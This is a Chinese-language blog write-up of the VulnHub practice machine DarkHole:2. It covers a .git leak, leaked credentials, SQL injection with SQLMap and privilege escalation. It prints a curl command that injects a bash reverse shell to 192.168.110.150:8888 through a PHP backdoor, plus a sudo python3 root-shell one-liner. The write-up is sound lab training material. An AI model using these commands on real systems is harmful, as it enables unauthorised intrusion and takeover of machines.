---
title: VulnHub DarkHole：2
date: 2026-06-10 18:42:00
categories: 
  - VulnHub
tags:
  - 敏感信息泄露
  - 弱口令
  - SQL 注入
  - 定时任务
  - /etc/sudoers 配置不当
  - Python3 提权
---

# DarkHole：2

项目地址：https://download.vulnhub.com/darkhole/darkhole_2.zip

是一个打包好的镜像文件

**注意：导入 ova 时一定要选择我已移动，否则没网**

使用 Nmap 扫描出开放服务及操作系统版本

![](https://pic1.imgdb.cn/item/6a2ed257f9d8b058002c0ce7.png)

### 敏感信息泄露

### .git 泄露

扫描出存在 `/.git/` 目录，使用 Git Dumper 下载下来

```bash
git clone https://github.com/internetwache/GitTools.git
cd GitTools/Dumper
./gitdumper.sh http://<target-ip>/.git/ /tmp/repo-dump
```

![](https://pic1.imgdb.cn/item/6a2edec2f9d8b058002c1f3f.png)

查看日志可以看到最新的修改记录是针对于 `login.php`

![](https://pic1.imgdb.cn/item/6a2edf84f9d8b058002c2003.png)

运行 `git diff a4d900a8d85e8938d3601f3cef113ee293028e10` 查看刚开始添加的 `login.php`

在里面翻找到初始的用户名密码

![](https://pic1.imgdb.cn/item/6a2edffef9d8b058002c2071.png)

## 弱口令

### login

来到登录页面登录

```
lush@admin.com:321
```

![](https://pic1.imgdb.cn/item/6a2ee09df9d8b058002c20dd.png)

### SSH

通过下面的 SQL 注入拿到的数据登录成功

![](https://pic1.imgdb.cn/item/6a2ee6fdf9d8b058002c21fe.png)

## SQL 注入

### id

登陆后网页存在 `id` 参数

![](https://pic1.imgdb.cn/item/6a2ee150f9d8b058002c2100.png)

使用 SQLMap 梭哈，一定要带上 Cookie——`--cookie=PHPSESSID="glqe49ducs05i7g03gcq8m5u0i"`

![](https://pic1.imgdb.cn/item/6a2ee5b7f9d8b058002c21cb.png)

有个 `ssh` 表，里面有用户名密码

![](https://pic1.imgdb.cn/item/6a2ee6c6f9d8b058002c21fd.png)

可以登录 SSH，截图在上面弱口令那一章

## 提权

### 定时任务

通过 `pspy64` 看到运行了一个 PHP 在本地 9999 端口，且给了路径

![](https://pic1.imgdb.cn/item/6a2ee8bdf9d8b058002c2255.png)

看了一眼是 PHP 后门

![](https://pic1.imgdb.cn/item/6a2ee8f4f9d8b058002c2260.png)

传入反弹 Shell

```bash
curl -v "http://127.0.0.1:9999/?cmd=bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.110.150%2F8888%200%3E%261%27"
```

成功反弹

![](https://pic1.imgdb.cn/item/6a2eeb75f9d8b058002c22c5.png)

查看历史命令找到密码，是 `gang`

![](https://pic1.imgdb.cn/item/6a2eebc6f9d8b058002c22d2.png)

SSH 登录上

![](https://pic1.imgdb.cn/item/6a2eec76f9d8b058002c3610.png)

### /etc/sudoers 配置不当

检查自身权限发现可以使用 Python3

![](https://pic1.imgdb.cn/item/6a2eeca3f9d8b058002c361b.png)

### Python3 提权

提权成功

```bash
sudo python3 -c 'import os;os.system("/bin/sh")'
```

![](https://pic1.imgdb.cn/item/6a2eececf9d8b058002c3626.png)